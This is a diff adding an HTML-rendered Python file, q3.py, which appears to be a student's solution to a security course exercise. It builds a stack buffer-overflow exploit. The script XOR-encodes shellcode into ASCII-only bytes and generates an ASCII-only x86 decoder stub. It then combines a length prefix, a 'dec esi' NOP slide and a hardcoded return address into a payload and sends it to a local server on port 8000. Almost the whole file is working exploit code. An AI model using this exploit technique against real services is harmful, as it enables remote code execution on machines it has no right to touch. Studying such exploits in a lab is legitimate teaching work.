@@ -1,0 +1,167 @@
+<html>
+<head>
+<title>q3.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.ln { color: #606366; font-weight: normal; font-style: normal; }
+.s0 { color: rgb(128,128,128); }
+.s1 { color: rgb(169,183,198); }
+.s2 { color: rgb(204,120,50); font-weight: bold; }
+.s3 { color: rgb(204,120,50); }
+.s4 { color: rgb(165,194,97); }
+.s5 { color: rgb(104,151,187); }
+.s6 { color: rgb(98,151,85); font-style: italic; }
+</style>
+</head>
+<BODY BGCOLOR="#2b2b2b">
+<TABLE CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<TR><TD><CENTER>
+<FONT FACE="Arial, Helvetica" COLOR="#000000">
+q3.py</FONT>
+</center></TD></TR></TABLE>
+<pre>
+<a name="l1"><span class="ln">1    </span></a><span class="s0">#!/usr/bin/python</span><span class="s1"> 
+<a name="l2"><span class="ln">2    </span></a> 
+<a name="l3"><span class="ln">3    </span></a></span><span class="s2">import </span><span class="s1">functools</span><span class="s3">, </span><span class="s1">os</span><span class="s3">, </span><span class="s1">socket</span><span class="s3">, </span><span class="s1">traceback</span><span class="s3">, </span><span class="s1">struct</span><span class="s3">, </span><span class="s1">assemble 
+<a name="l4"><span class="ln">4    </span></a></span><span class="s2">import </span><span class="s1">q2 
+<a name="l5"><span class="ln">5    </span></a> 
+<a name="l6"><span class="ln">6    </span></a> 
+<a name="l7"><span class="ln">7    </span></a>HOST        = </span><span class="s4">'127.0.0.1'</span><span class="s1"> 
+<a name="l8"><span class="ln">8    </span></a>SERVER_PORT = </span><span class="s5">8000</span><span class="s1"> 
+<a name="l9"><span class="ln">9    </span></a>LOCAL_PORT  = </span><span class="s5">1337</span><span class="s1"> 
+<a name="l10"><span class="ln">10   </span></a> 
+<a name="l11"><span class="ln">11   </span></a> 
+<a name="l12"><span class="ln">12   </span></a>ASCII_MAX = </span><span class="s5">0x7f</span><span class="s1"> 
+<a name="l13"><span class="ln">13   </span></a> 
+<a name="l14"><span class="ln">14   </span></a> 
+<a name="l15"><span class="ln">15   </span></a></span><span class="s2">def </span><span class="s1">warn_invalid_ascii(selector=None): 
+<a name="l16"><span class="ln">16   </span></a>    selector = selector </span><span class="s2">or </span><span class="s1">(</span><span class="s2">lambda </span><span class="s1">x: x) 
+<a name="l17"><span class="ln">17   </span></a>    </span><span class="s2">def </span><span class="s1">decorator(func): 
+<a name="l18"><span class="ln">18   </span></a>        @functools.wraps(func) 
+<a name="l19"><span class="ln">19   </span></a>        </span><span class="s2">def </span><span class="s1">result(*args</span><span class="s3">, </span><span class="s1">**kwargs): 
+<a name="l20"><span class="ln">20   </span></a>            ret = func(*args</span><span class="s3">, </span><span class="s1">**kwargs) 
+<a name="l21"><span class="ln">21   </span></a>            </span><span class="s2">if </span><span class="s1">any(ord(c) &gt; ASCII_MAX </span><span class="s2">for </span><span class="s1">c </span><span class="s2">in </span><span class="s1">selector(ret)): 
+<a name="l22"><span class="ln">22   </span></a>                </span><span class="s2">print</span><span class="s1">(</span><span class="s4">'WARNING: Non ASCII chars in return value from %s at</span><span class="s3">\n</span><span class="s4">%s'</span><span class="s1"> 
+<a name="l23"><span class="ln">23   </span></a>                      % (func.__name__</span><span class="s3">, </span><span class="s4">''</span><span class="s1">.join(traceback.format_stack()[:-</span><span class="s5">1</span><span class="s1">]))) 
+<a name="l24"><span class="ln">24   </span></a>            </span><span class="s2">return </span><span class="s1">ret 
+<a name="l25"><span class="ln">25   </span></a>        </span><span class="s2">return </span><span class="s1">result 
+<a name="l26"><span class="ln">26   </span></a>    </span><span class="s2">return </span><span class="s1">decorator 
+<a name="l27"><span class="ln">27   </span></a> 
+<a name="l28"><span class="ln">28   </span></a> 
+<a name="l29"><span class="ln">29   </span></a></span><span class="s2">def </span><span class="s1">get_raw_shellcode(): 
+<a name="l30"><span class="ln">30   </span></a>    </span><span class="s2">return </span><span class="s1">q2.get_shellcode() 
+<a name="l31"><span class="ln">31   </span></a> 
+<a name="l32"><span class="ln">32   </span></a> 
+<a name="l33"><span class="ln">33   </span></a>@warn_invalid_ascii(</span><span class="s2">lambda </span><span class="s1">(x</span><span class="s3">,</span><span class="s1">y): x) 
+<a name="l34"><span class="ln">34   </span></a></span><span class="s2">def </span><span class="s1">encode(data): 
+<a name="l35"><span class="ln">35   </span></a>    </span><span class="s6">'''Encode data to be valid ASCII, by XOR-ing non ASCII bytes with 0xff. 
+<a name="l36"><span class="ln">36   </span></a> 
+<a name="l37"><span class="ln">37   </span></a>    Return the encoded data and the indices that were XOR-ed. 
+<a name="l38"><span class="ln">38   </span></a>    - To return multiple values, do `return a, b` 
+<a name="l39"><span class="ln">39   </span></a>    - To get multiple returned values do `a, b = encode(data)` 
+<a name="l40"><span class="ln">40   </span></a>    '''</span><span class="s1"> 
+<a name="l41"><span class="ln">41   </span></a>    </span><span class="s0"># TODO: IMPLEMENT THIS FUNCTION</span><span class="s1"> 
+<a name="l42"><span class="ln">42   </span></a>    xor_indces = [] 
+<a name="l43"><span class="ln">43   </span></a>    new_shellcode = </span><span class="s4">&quot;&quot;</span><span class="s1"> 
+<a name="l44"><span class="ln">44   </span></a>    ascii_xor = </span><span class="s5">0xff</span><span class="s1"> 
+<a name="l45"><span class="ln">45   </span></a>    </span><span class="s2">for </span><span class="s1">i </span><span class="s2">in </span><span class="s1">range(len(data)): 
+<a name="l46"><span class="ln">46   </span></a>        code_byte = struct.unpack(</span><span class="s4">&quot;B&quot;</span><span class="s3">, </span><span class="s1">data[i])[</span><span class="s5">0</span><span class="s1">] </span><span class="s0"># convert to unsigned byte numeric type</span><span class="s1"> 
+<a name="l47"><span class="ln">47   </span></a>        </span><span class="s2">if </span><span class="s1">code_byte &gt; ASCII_MAX: 
+<a name="l48"><span class="ln">48   </span></a>            code_byte ^= ascii_xor </span><span class="s0"># xor with 0xff</span><span class="s1"> 
+<a name="l49"><span class="ln">49   </span></a>            code_byte = struct.pack(</span><span class="s4">&quot;B&quot;</span><span class="s3">, </span><span class="s1">code_byte) </span><span class="s0"># pack again to unsigned byte</span><span class="s1"> 
+<a name="l50"><span class="ln">50   </span></a>            new_shellcode += code_byte </span><span class="s0"># append to new shellcode</span><span class="s1"> 
+<a name="l51"><span class="ln">51   </span></a>            xor_indces.append(i) </span><span class="s0"># mark index that was xor'ed</span><span class="s1"> 
+<a name="l52"><span class="ln">52   </span></a>        </span><span class="s2">else</span><span class="s1">: 
+<a name="l53"><span class="ln">53   </span></a>            new_shellcode += data[i] </span><span class="s0"># else, don't change data</span><span class="s1"> 
+<a name="l54"><span class="ln">54   </span></a>    </span><span class="s2">return </span><span class="s1">new_shellcode</span><span class="s3">, </span><span class="s1">xor_indces 
+<a name="l55"><span class="ln">55   </span></a> 
+<a name="l56"><span class="ln">56   </span></a> 
+<a name="l57"><span class="ln">57   </span></a>@warn_invalid_ascii() 
+<a name="l58"><span class="ln">58   </span></a></span><span class="s2">def </span><span class="s1">get_decoder(indices): 
+<a name="l59"><span class="ln">59   </span></a>    </span><span class="s6">'''Return the assembled decoder code.'''</span><span class="s1"> 
+<a name="l60"><span class="ln">60   </span></a>    </span><span class="s0"># TODO: IMPLEMENT THIS FUNCTION</span><span class="s1"> 
+<a name="l61"><span class="ln">61   </span></a>    create_ff = </span><span class="s4">&quot;push 0; pop ebx; dec ebx;&quot; </span><span class="s0"># insert into ebx the value ff with only ascii chars</span><span class="s1"> 
+<a name="l62"><span class="ln">62   </span></a>    init_edx = </span><span class="s4">&quot;push 0; pop edx;&quot; </span><span class="s0"># initiate edx to zero</span><span class="s1"> 
+<a name="l63"><span class="ln">63   </span></a>    decoder_assembly = create_ff + init_edx 
+<a name="l64"><span class="ln">64   </span></a> 
+<a name="l65"><span class="ln">65   </span></a>    current_value = </span><span class="s5">0</span><span class="s1"> 
+<a name="l66"><span class="ln">66   </span></a>    </span><span class="s2">for </span><span class="s1">i </span><span class="s2">in </span><span class="s1">indices: 
+<a name="l67"><span class="ln">67   </span></a>        index_diff = i - current_value </span><span class="s0"># this is how much we should increment edx for current i vaule</span><span class="s1"> 
+<a name="l68"><span class="ln">68   </span></a>        inc = </span><span class="s4">&quot;inc eax;&quot; </span><span class="s1">* index_diff </span><span class="s0"># do as much increment as needed</span><span class="s1"> 
+<a name="l69"><span class="ln">69   </span></a>        xr = </span><span class="s4">&quot;xor byte ptr [eax], BL;&quot; </span><span class="s0"># then, perform the decoding</span><span class="s1"> 
+<a name="l70"><span class="ln">70   </span></a>        decoder_assembly += inc + xr </span><span class="s0"># update our decoder code</span><span class="s1"> 
+<a name="l71"><span class="ln">71   </span></a>        current_value += index_diff </span><span class="s0"># update current edx value</span><span class="s1"> 
+<a name="l72"><span class="ln">72   </span></a> 
+<a name="l73"><span class="ln">73   </span></a>    decoder = assemble.assemble_data(decoder_assembly) </span><span class="s0"># assemble our code</span><span class="s1"> 
+<a name="l74"><span class="ln">74   </span></a>    </span><span class="s2">return </span><span class="s1">decoder 
+<a name="l75"><span class="ln">75   </span></a> 
+<a name="l76"><span class="ln">76   </span></a> 
+<a name="l77"><span class="ln">77   </span></a>@warn_invalid_ascii() 
+<a name="l78"><span class="ln">78   </span></a></span><span class="s2">def </span><span class="s1">get_shellcode(): 
+<a name="l79"><span class="ln">79   </span></a>    </span><span class="s6">'''This function returns the machine code (bytes) of the shellcode. 
+<a name="l80"><span class="ln">80   </span></a> 
+<a name="l81"><span class="ln">81   </span></a>    This does not include the size, return address, nop slide or anything else! 
+<a name="l82"><span class="ln">82   </span></a>    From this function you should return only the shellcode! 
+<a name="l83"><span class="ln">83   </span></a>    '''</span><span class="s1"> 
+<a name="l84"><span class="ln">84   </span></a>    q2_shellcode = get_raw_shellcode() 
+<a name="l85"><span class="ln">85   </span></a>    </span><span class="s0"># TODO: IMPLEMENT THIS FUNCTION</span><span class="s1"> 
+<a name="l86"><span class="ln">86   </span></a>    shellcode_length = len(q2_shellcode) </span><span class="s0"># shellcode length doesn't change after </span><span class="s1"> 
+<a name="l87"><span class="ln">87   </span></a>    encoded_shellcode</span><span class="s3">, </span><span class="s1">indices = encode(q2_shellcode) 
+<a name="l88"><span class="ln">88   </span></a>    decoder_shellcode = get_decoder(indices) 
+<a name="l89"><span class="ln">89   </span></a>    </span><span class="s0"># print len(decoder_shellcode)</span><span class="s1"> 
+<a name="l90"><span class="ln">90   </span></a>    </span><span class="s0"># print shellcode_length</span><span class="s1"> 
+<a name="l91"><span class="ln">91   </span></a> 
+<a name="l92"><span class="ln">92   </span></a>    init_to_esp = </span><span class="s4">&quot;push esp; pop eax;&quot; </span><span class="s0"># init eax as esp value</span><span class="s1"> 
+<a name="l93"><span class="ln">93   </span></a>    sub_eax = </span><span class="s4">&quot;dec eax;&quot; </span><span class="s1">* (shellcode_length + </span><span class="s5">4</span><span class="s1">) </span><span class="s0"># subtract from esp shellcode length + 4 bytes of RET</span><span class="s1"> 
+<a name="l94"><span class="ln">94   </span></a>    </span><span class="s0"># after these two lines eax should contains the value 0xbfffe0e1 which is the beginnig of the shellcode</span><span class="s1"> 
+<a name="l95"><span class="ln">95   </span></a>    init_eax = init_to_esp + sub_eax 
+<a name="l96"><span class="ln">96   </span></a>    init_eax_assm = assemble.assemble_data(init_eax) 
+<a name="l97"><span class="ln">97   </span></a>    total_shellcode = init_eax_assm + decoder_shellcode + encoded_shellcode 
+<a name="l98"><span class="ln">98   </span></a>    </span><span class="s0"># print [hex(struct.unpack(&quot;B&quot;, b)[0]) for b in init_eax_assm]</span><span class="s1"> 
+<a name="l99"><span class="ln">99   </span></a>    </span><span class="s2">return </span><span class="s1">total_shellcode 
+<a name="l100"><span class="ln">100  </span></a> 
+<a name="l101"><span class="ln">101  </span></a> 
+<a name="l102"><span class="ln">102  </span></a>@warn_invalid_ascii(</span><span class="s2">lambda </span><span class="s1">x: x[</span><span class="s5">4</span><span class="s1">:-</span><span class="s5">4</span><span class="s1">]) 
+<a name="l103"><span class="ln">103  </span></a></span><span class="s2">def </span><span class="s1">get_payload(): 
+<a name="l104"><span class="ln">104  </span></a>    </span><span class="s6">'''This function returns the data to send over the socket to the server. 
+<a name="l105"><span class="ln">105  </span></a> 
+<a name="l106"><span class="ln">106  </span></a>    This includes everything - the 4 bytes for size, the nop slide, the 
+<a name="l107"><span class="ln">107  </span></a>    shellcode and the return address. 
+<a name="l108"><span class="ln">108  </span></a>    '''</span><span class="s1"> 
+<a name="l109"><span class="ln">109  </span></a>    </span><span class="s0"># TODO: IMPLEMENT THIS FUNCTION</span><span class="s1"> 
+<a name="l110"><span class="ln">110  </span></a> 
+<a name="l111"><span class="ln">111  </span></a>    </span><span class="s0"># new_nop = &quot;inc edi;&quot;</span><span class="s1"> 
+<a name="l112"><span class="ln">112  </span></a>    </span><span class="s0"># nop = assemble.assemble_data(new_nop)</span><span class="s1"> 
+<a name="l113"><span class="ln">113  </span></a>    </span><span class="s0"># print [hex(struct.unpack(&quot;B&quot;, b)[0]) for b in nop]</span><span class="s1"> 
+<a name="l114"><span class="ln">114  </span></a> 
+<a name="l115"><span class="ln">115  </span></a>    desired_shell_length = </span><span class="s5">1040 </span><span class="s0"># as explained in q1</span><span class="s1"> 
+<a name="l116"><span class="ln">116  </span></a>    new_nop = </span><span class="s4">'</span><span class="s3">\x4e</span><span class="s4">' </span><span class="s0"># this is the instruction 'dec esi'. we replace our nop with this</span><span class="s1"> 
+<a name="l117"><span class="ln">117  </span></a>    shellcode = get_shellcode() 
+<a name="l118"><span class="ln">118  </span></a>    shellcode_length = len(shellcode) 
+<a name="l119"><span class="ln">119  </span></a>    address_to_return = </span><span class="s4">&quot;</span><span class="s3">\x20\xde\xff\xbf</span><span class="s4">&quot; </span><span class="s0"># this is the address in the middle of the NOPs slide</span><span class="s1"> 
+<a name="l120"><span class="ln">120  </span></a>    </span><span class="s0"># this time our nops slide is short only ~200 bytes so we will jump 100 bytes after the begining of the buffer</span><span class="s1"> 
+<a name="l121"><span class="ln">121  </span></a> 
+<a name="l122"><span class="ln">122  </span></a>    </span><span class="s0"># full structe - slide NOPs, init eax with encoded shellcode address, decoder, shellcode, address to return</span><span class="s1"> 
+<a name="l123"><span class="ln">123  </span></a>    message = new_nop * (desired_shell_length - shellcode_length) + shellcode + address_to_return 
+<a name="l124"><span class="ln">124  </span></a> 
+<a name="l125"><span class="ln">125  </span></a>    message_length = len(message) 
+<a name="l126"><span class="ln">126  </span></a>    message_length_newtork_order = struct.pack(</span><span class="s4">'&gt;L'</span><span class="s3">, </span><span class="s1">message_length) </span><span class="s0"># add size as in q1</span><span class="s1"> 
+<a name="l127"><span class="ln">127  </span></a> 
+<a name="l128"><span class="ln">128  </span></a>    </span><span class="s2">return </span><span class="s1">message_length_newtork_order + message </span><span class="s0"># return payoload - message + size</span><span class="s1"> 
+<a name="l129"><span class="ln">129  </span></a> 
+<a name="l130"><span class="ln">130  </span></a> 
+<a name="l131"><span class="ln">131  </span></a></span><span class="s2">def </span><span class="s1">main(): 
+<a name="l132"><span class="ln">132  </span></a>    payload = get_payload() 
+<a name="l133"><span class="ln">133  </span></a>    conn = socket.socket() 
+<a name="l134"><span class="ln">134  </span></a>    conn.connect((HOST</span><span class="s3">, </span><span class="s1">SERVER_PORT)) 
+<a name="l135"><span class="ln">135  </span></a>    </span><span class="s2">try</span><span class="s1">: 
+<a name="l136"><span class="ln">136  </span></a>        conn.sendall(payload) 
+<a name="l137"><span class="ln">137  </span></a>    </span><span class="s2">finally</span><span class="s1">: 
+<a name="l138"><span class="ln">138  </span></a>        conn.close() 
+<a name="l139"><span class="ln">139  </span></a> 
+<a name="l140"><span class="ln">140  </span></a> 
+<a name="l141"><span class="ln">141  </span></a></span><span class="s2">if </span><span class="s1">__name__ == </span><span class="s4">'__main__'</span><span class="s1">: 
+<a name="l142"><span class="ln">142  </span></a>    main() 
+<a name="l143"><span class="ln">143  </span></a></span></pre>
+</body>
+</html>
